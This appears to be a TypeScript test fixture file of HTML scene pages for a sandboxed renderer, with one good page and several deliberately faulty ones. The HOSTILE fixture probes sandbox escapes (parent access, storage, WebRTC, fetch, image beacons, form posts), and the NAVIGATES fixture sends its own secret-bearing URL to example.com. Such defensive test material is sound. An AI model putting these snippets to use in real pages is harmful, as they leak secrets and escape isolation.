/**
 * Scene pages for tests: one well made, and one for each thing the check exists to catch.
 */
const page = (body: string, style = ''): string =>
  `<!doctype html><html><head><meta charset="utf-8"><style>html,body{margin:0;width:1920px;height:1080px;overflow:hidden;background:var(--talkie-bg);color:var(--talkie-body);font-family:var(--talkie-font-body)}${style}</style></head><body>${body}</body></html>`

/** Themed, animated by CSS and by time, with text inside the frame. */
export const GOOD = page(
  '<h1>Revenue</h1><div class="bar"></div><p id="clock"></p><script>talkie.onFrame((t) => { document.getElementById("clock").textContent = t.toFixed(1) + " s" })</script>',
  'h1{color:var(--talkie-heading);font-size:96px;margin:120px}.bar{height:80px;margin:0 120px;background:var(--talkie-accent);width:0;animation:grow 2s linear forwards}@keyframes grow{to{width:1200px}}#clock{margin:120px;font-size:48px}'
)

/** Tries every way out of the sandbox it can think of, and writes down any that worked. */
export const HOSTILE = page(
  `<pre id="out" style="font-size:40px"></pre><script>
const out = []
const attempt = (name, fn) => { try { out.push((fn() === false ? 'no:' : 'ok:') + name) } catch (e) { out.push('no:' + name) } }
attempt('parent', () => window.parent.document.title)
attempt('api', () => (window.top.api ? true : false))
attempt('storage', () => localStorage.setItem('a', '1'))
attempt('webrtc', () => typeof RTCPeerConnection === 'function' || typeof webkitRTCPeerConnection === 'function' ? true : false)
attempt('open', () => (window.open('https://example.com') ? true : false))
fetch('https://example.com').then(() => document.body.append(' ok:fetch'), () => {})
const img = new Image(); img.onload = () => document.body.append(' ok:image'); img.src = 'https://example.com/x.png'
document.getElementById('out').textContent = out.join(' ')
const form = document.createElement('form'); form.action = 'https://example.com'; form.method = 'post'; document.body.append(form)
try { form.submit() } catch (e) {}
</script>`,
  '#out{color:var(--talkie-body)}'
)

/** Tries to leave, taking its own address — secret and all — with it. */
export const NAVIGATES = page(
  `<h1>Leaving</h1><script>location.href = 'https://example.com/?leak=' + encodeURIComponent(location.href)</script>`,
  'h1{color:var(--talkie-heading)}'
)

export const HARD_CODED = page('<h1 style="color:#ff0000;font-size:120px;margin:120px">Off brand</h1>')

/** Moves a fixed amount per tick, so where it is depends on how many ticks came before. */
export const PER_TICK = page(
  '<div id="dot"></div><script>let x = 0; const dot = document.getElementById("dot"); const step = () => { x += 8; dot.style.left = x + "px"; requestAnimationFrame(step) }; requestAnimationFrame(step)</script>',
  '#dot{position:absolute;top:500px;width:60px;height:60px;background:var(--talkie-accent)}'
)

/** Never finishes a frame. */
export const SILENT = page('<h1>Waiting</h1><script>talkie.onFrame(() => new Promise(() => {}))</script>', 'h1{color:var(--talkie-heading)}')

export const OVERFLOW = page(
  '<p>This line of text is far too long to fit across the frame at this size, and runs out of it on the right</p>',
  'p{white-space:nowrap;font-size:120px;margin:120px}'
)

export const EMPTY = page('')
